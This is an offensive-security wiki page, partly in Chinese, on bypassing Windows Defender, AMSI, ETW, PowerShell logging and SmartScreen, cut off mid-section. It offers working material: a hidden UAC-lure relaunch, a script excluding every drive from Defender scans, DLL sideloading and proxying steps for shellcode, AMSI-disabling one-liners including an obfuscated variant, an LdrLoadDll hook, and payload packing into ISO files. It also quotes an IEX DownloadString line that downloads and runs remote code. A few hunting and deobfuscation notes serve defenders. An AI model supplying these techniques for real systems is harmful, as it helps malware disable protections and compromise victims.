# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was initially written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于停止 Windows Defender 工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来停止 Windows Defender 工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### 在篡改 Defender 之前用安装程序风格的 UAC 诱饵

公开的加载器常常伪装成游戏作弊程序，并以未签名的 Node.js/Nexe 安装程序形式分发；它们会先 **要求用户提权**，然后再禁用 Defender。流程很简单：

1. 通过 `net session` 探测是否处于管理员上下文。该命令只有在调用者拥有管理员权限时才会成功，因此失败表示加载器正在以标准用户身份运行。
2. 立即使用 `RunAs` 动词重新启动自身，以在保留原始命令行的同时触发预期的 UAC 许可提示。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者本来就以为自己在安装“cracked”软件，所以这个提示通常会被接受，从而让 malware 获得更改 Defender policy 所需的权限。

### 对每个盘符都设置全面的 `MpPreference` exclusions

一旦提权，GachiLoader-style 链条会最大化 Defender 的盲区，而不是直接禁用服务。loader 先结束 GUI watchdog (`taskkill /F /IM SecHealthUI.exe`)，然后推送 **极其宽泛的 exclusions**，让每个用户配置文件、系统目录和可移动磁盘都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令将输出 "C:\Program Files\\" 中易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你自己**探索可被 DLL Hijack/Sideload 的程序**，如果正确操作，这种技术相当隐蔽，但如果你使用公开已知的 DLL Sideloadable 程序，你可能会很容易被抓到。

仅仅放置一个程序期望加载的同名恶意 DLL，并不会加载你的 payload，因为程序期望该 DLL 内包含某些特定函数，为了解决这个问题，我们将使用另一种叫做 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会把程序从代理（以及恶意）DLL 发出的调用转发到原始 DLL，从而保留程序功能，并能够处理你的 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目

我遵循的步骤如下：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令会给我们 2 个文件：一个 DLL 源代码模板，以及原始重命名后的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的检测率都是 0/26！我会把这称为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的视频，以及 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以便更深入地了解我们刚才讨论的内容。

### 滥用 Forwarded Exports (ForwardSideLoading)

Windows PE 模块可以导出函数，而这些函数实际上是 “forwarders”：导出项里不是代码地址，而是形如 `TargetDll.TargetFunc` 的 ASCII 字符串。当调用方解析该导出时，Windows loader 会：

- 如果 `TargetDll` 还未加载，则加载它
- 从中解析 `TargetFunc`

需要理解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，那么它会从受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则会使用正常的 DLL 搜索顺序，这包括执行 forward 解析的模块所在目录。

这就形成了一个间接 sideloading 原语：找到一个签名 DLL，它导出的某个函数被 forwarded 到一个非-KnownDLL 的模块名，然后把这个签名 DLL 和一个攻击者控制的、名字与 forwarded 目标模块完全相同的 DLL 放在同一目录下。当这个 forwarded 导出被调用时，loader 会解析 forward 并从同一目录加载你的 DLL，执行你的 DllMain。

Windows 11 上观察到的示例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是一个 KnownDLL，因此它会通过正常搜索顺序来解析。

PoC（复制粘贴）：
1) 将已签名的系统 DLL 复制到一个可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 将恶意的 `NCRYPTPROV.dll` 放到同一文件夹中。一个最小的 DllMain 就足以获得代码执行；你不需要实现 forwarded function 就能触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3）使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
观察到的行为：
- rundll32（已签名）加载 side-by-side `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，loader 会跟随 forward 到 `NCRYPTPROV.SetAuditingInterface`
- 然后 loader 会从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，只有在 `DllMain` 已经运行之后，才会出现 “missing API” 错误

狩猎建议：
- 重点关注 forward 的 exports，其中目标模块不是 KnownDLL。KnownDLLs 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 你可以使用如下工具枚举 forwarded exports：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder inventory 以搜索候选项：https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载已签名 DLL，随后从该目录加载同名但非 KnownDLLs 的文件
- 对如下进程/模块链进行告警：`rundll32.exe` → 非系统 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制执行 code integrity policies（WDAC/AppLocker），并禁止在应用程序目录中写入+执行

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 只是一个猫鼠游戏，今天有效的方法明天可能就会被检测到，所以永远不要只依赖一个工具，如果可能，尽量组合多种 evasion 技术。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs 往往会在 `ntdll.dll` 的 syscall stubs 上放置 **user-mode inline hooks**。为了绕过这些 hooks，你可以生成 **direct** 或 **indirect** syscall stubs，它们会加载正确的 **SSN**（System Service Number），并在不执行被 hook 的导出入口点的情况下切换到 kernel mode。

**Invocation options:**
- **Direct (embedded)**: 在生成的 stub 中直接发出 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` export）。
- **Indirect**: 跳转到 `ntdll` 中现有的 `syscall` gadget，这样 kernel transition 看起来像是来自 `ntdll`（有助于 heuristic evasion）；**randomized indirect** 会为每次调用从池中挑选一个 gadget。
- **Egg-hunt**: 避免在磁盘上嵌入静态的 `0F 05` opcode 序列；在运行时解析 syscall 序列。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: 通过按 virtual address 对 syscall stubs 排序来推断 SSNs，而不是读取 stub 字节。
- **SyscallsFromDisk**: 映射一个干净的 `\KnownDlls\ntdll.dll`，从它的 `.text` 中读取 SSNs，然后取消映射（绕过所有内存中的 hooks）。
- **RecycledGate**: 当 stub 是干净的时，结合 VA 排序的 SSN 推断和 opcode 验证；如果被 hook，则回退到 VA 推断。
- **HW Breakpoint**: 在 `syscall` 指令上设置 DR0，并使用 VEH 在运行时从 `EAX` 捕获 SSN，而无需解析被 hook 的字节。

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI 被创建用来防止 “[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)”。最初，AV 只能扫描**磁盘上的文件**，所以如果你能以某种方式**直接在内存中**执行 payload，AV 就无法阻止，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的这些组件中。

- User Account Control，或 UAC（EXE、COM、MSI 或 ActiveX 安装的提权）
- PowerShell（脚本、交互式使用，以及动态代码求值）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA macros

它允许 antivirus solutions 通过以一种既未加密又未混淆的形式暴露脚本内容来检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上产生以下告警。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它是如何在前面加上 `amsi:`，然后再加上脚本运行的可执行文件路径，在这个例子中是 powershell.exe

我们没有把任何文件落到磁盘上，但仍然因为 AMSI 而在内存中被捕获。

此外，从 **.NET 4.8** 开始，C# code 也会经过 AMSI。这甚至会影响到使用 `Assembly.Load(byte[])` 进行内存中执行。因此，如果你想规避 AMSI，建议使用较低版本的 .NET（如 4.7.2 或更低）进行内存中执行。

绕过 AMSI 有几种方法：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此修改你尝试加载的脚本是规避检测的一个好方法。

不过，AMSI 具备对脚本进行去混淆的能力，即使脚本有多层混淆也可能被还原，所以混淆是否有效取决于具体做法。这使得规避并不那么直接。尽管如此，有时你只需要改几个变量名就行，所以这取决于某个内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将一个 DLL 加载到 powershell（以及 cscript.exe、wscript.exe 等）进程中来实现的，所以即使以非特权用户身份运行，也可以很容易地篡改它。由于 AMSI 实现上的这个缺陷，研究人员发现了多种绕过 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）会导致当前进程不再启动任何扫描。这个方法最初由 [Matt Graeber](https://twitter.com/mattifestation) 公开，Microsoft 之后开发了一个 signature 来防止更广泛的使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需要一行 powershell 代码，就能让 AMSI 对当前 powershell 进程失效。当然，这一行本身已经被 AMSI 标记了，所以需要做一些修改才能使用这个技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 中拿到的一个修改版 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请记住，这篇文章发布后大概率会被标记，所以如果你的计划是保持不被发现，就不要发布任何代码。

**Memory Patching**

这一技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，它通过找到 amsi.dll 中 "AmsiScanBuffer" 函数的地址（该函数负责扫描用户提供的输入），然后用指令覆盖它，使其返回 E_INVALIDARG 的代码，这样，实际扫描的结果就会返回 0，而这会被解释为干净结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的解释。

还有许多其他用于绕过 AMSI 的 powershell 技术，查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多。

### 通过阻止 amsi.dll 加载来阻止 AMSI（LdrLoadDll hook）

AMSI 只有在 `amsi.dll` 被加载到当前进程后才会初始化。一种稳健、与语言无关的绕过方法，是在 `ntdll!LdrLoadDll` 上放置一个用户态 hook，当请求的模块是 `amsi.dll` 时返回错误。这样，AMSI 就永远不会加载，并且该进程不会发生任何扫描。

实现概述（x64 C/C++ pseudocode）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- 适用于 PowerShell、WScript/CScript 以及自定义 loaders 等所有会加载 AMSI 的情况。
- 可配合通过 stdin 传入脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`），避免长 command-line artefacts。
- 也见于通过 LOLBins 执行的 loaders（例如，`regsvr32` 调用 `DllRegisterServer`）。

工具 **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** 也可以生成用于绕过 AMSI 的脚本。
工具 **[https://amsibypass.com/](https://amsibypass.com/)** 也可以生成用于绕过 AMSI 的脚本，通过随机化 user-defined function、variables、characters expression 来避免 signature，并对 PowerShell keywords 应用随机字符大小写以规避 signature。

**Remove the detected signature**

你可以使用 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 之类的工具，从当前进程的内存中移除检测到的 AMSI signature。这个工具通过扫描当前进程内存中的 AMSI signature，然后用 NOP instructions 覆写它，从而将其从内存中移除。

**AV/EDR products that uses AMSI**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 中找到使用 AMSI 的 AV/EDR products 列表。

**Use Powershell version 2**
如果你使用 PowerShell version 2，AMSI 将不会被加载，因此你可以在不被 AMSI 扫描的情况下运行脚本。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一种功能，允许你记录系统上执行的所有 PowerShell 命令。这对于审计和排障很有用，但它也可能成为**想要规避检测的攻击者的问题**。

要绕过 PowerShell logging，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**: 你可以使用类似 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 的工具来实现这个目的。
- **Use Powershell version 2**: 如果你使用 PowerShell version 2，AMSI 将不会被加载，因此你可以运行脚本而不会被 AMSI 扫描。你可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来启动一个 without defenses 的 powershell（这就是 Cobal Strike 中的 `powerpick` 所使用的方式）。


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目旨在提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和 tamper-proofing 提升软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示了如何使用 `C++11/14` 语言，在编译时生成 obfuscated 代码，而无需任何外部工具，也无需修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ template metaprogramming framework 添加一层 obfuscated operations，从而让想要破解该应用的人更难下手。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 binary obfuscator，能够 obfuscate 各种不同的 pe files，包括：.exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意 executables 的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个面向 LLVM-supported languages 的细粒度 code obfuscation framework，使用 ROP (return-oriented programming)。ROPfuscator 通过将常规指令转换为 ROP chains，在 assembly code level 对程序进行 obfuscate，从而破坏我们对正常 control flow 的自然认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是一个用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有 EXE/DLL 转换为 shellcode，然后再加载它们

## SmartScreen & MoTW

你可能在从 internet 下载并执行某些 executables 时见过这个界面。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护最终用户免于运行潜在恶意应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要基于 reputation-based approach 工作，这意味着不常见的下载应用程序会触发 SmartScreen，从而提醒并阻止最终用户执行该文件（不过仍然可以通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从 internet 下载文件时会自动创建，并附带其下载来源 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> 需要注意的是，使用 **trusted** signing certificate 签名的 executables **won't trigger SmartScreen**。

一种非常有效的方式，可以防止你的 payloads 被打上 Mark of The Web，就是把它们打包进某种容器中，比如 ISO。这是因为 Mark-of-the-Web (MOTW) **cannot** 被应用到 **non NTFS** 卷上。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包到输出容器中以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
这里是一个通过使用 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) 将 payload 打包进 ISO 文件来绕过 SmartScreen 的示例

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志机制，允许应用程序和系统组件 **记录事件**。不过，它也可以被安全产品用来监控和检测恶意活动。

类似于 AMSI 被禁用（绕过）一样，也可以让用户空间进程中的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这可以通过在内存中 patch 该函数来实现，让它直接返回，从而有效禁用该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 找到更多信息。


## C# Assembly Reflection

将 C# binaries 加载到内存中已经存在很久了，而且它仍然是运行 post-exploitation tools 而不被 AV 发现的非常好的一种方式。

由于 payload 会直接加载到内存中而不接触磁盘，我们只需要担心为整个进程 patch AMSI。

大多数 C2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havoc 等）已经提供了直接在内存中执行 C# assemblies 的能力，但实现方式有多种：

- **Fork\&Run**

